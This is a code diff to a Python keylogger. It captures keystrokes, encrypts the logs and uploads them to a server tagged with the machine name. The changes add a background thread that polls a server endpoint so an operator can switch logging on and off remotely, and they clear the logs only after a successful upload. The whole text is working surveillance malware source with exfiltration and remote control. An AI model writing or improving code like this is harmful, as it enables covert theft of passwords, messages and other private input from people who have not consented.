@@ -65,18 +65,26 @@ class ServerSender:
                     encrypted_data = self.fernet.encrypt(json.dumps(new_task).encode())
                     headers = {"X-Machine-Name": self.machine_name}
                     response = requests.post(self.server_url, data=encrypted_data, headers=headers)
-                    print(f"Data sent to server. Response: {response.text}")
-                    self.service.clear_logs()
+                    if not response.ok:
+                        print(f"Upload failed: {response.status_code} {response.text}")
+                    else:
+                        print("Upload OK")
+                        # Clear logs only on successful upload
+                        self.service.clear_logs()
                 except requests.exceptions.RequestException as e:
                     print(f"Error sending data: {e}")
-            time.sleep(2)
+            time.sleep(10)
 
 class KeyLoggerManager:
     def __init__(self):
         self.service = KeyLoggerService()
         self.file_writer = FileWriter()
-        self.server_sender = ServerSender("http://127.0.0.1:5000/api/upload", self.service)
+        self.machine_name = platform.node()
+        self.server_base = "http://127.0.0.1:5000"
+        self.server_sender = ServerSender(f"{self.server_base}/api/upload", self.service, self.machine_name)
         self.listener = None
+        # Start background poller to follow desired toggle state from server
+        threading.Thread(target=self._poll_toggle_state, daemon=True).start()
 
     def handle_key_press(self, key):
         self.service.add_key(key)
@@ -85,10 +93,47 @@ class KeyLoggerManager:
             self.file_writer.write_to_file(logs)
 
     def start(self):
-        with keyboard.Listener(on_release=self.handle_key_press) as listener:
-            self.listener = listener
-            listener.join()
+        if not self.listener:
+            self.listener = keyboard.Listener(on_release=self.handle_key_press)
+            self.listener.start()
+            print("Keylogger started.")
+
+    def stop(self):
+        if self.listener:
+            self.listener.stop()
+            self.listener = None
+            print("Keylogger stopped.")
+
+    def toggle(self, start=True):
+        if start:
+            if not self.listener:
+                print("Starting keylogger...")
+                self.start()
+        else:
+            self.stop()
+
+    def _poll_toggle_state(self):
+        while True:
+            try:
+                url = f"{self.server_base}/api/toggle"
+                params = {"machine": self.machine_name}
+                resp = requests.get(url, params=params, timeout=5)
+                if resp.ok:
+                    desired = resp.json().get("status")
+                    if desired is True and not self.listener:
+                        self.start()
+                    elif desired is False and self.listener:
+                        self.stop()
+            except requests.exceptions.RequestException as e:
+                print(f"Toggle poll error: {e}")
+            time.sleep(2)
 
 if __name__ == "__main__":
     manager = KeyLoggerManager()
-    manager.start()
+    manager.toggle(start=True)
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        manager.stop()
+        print("Program exited.")
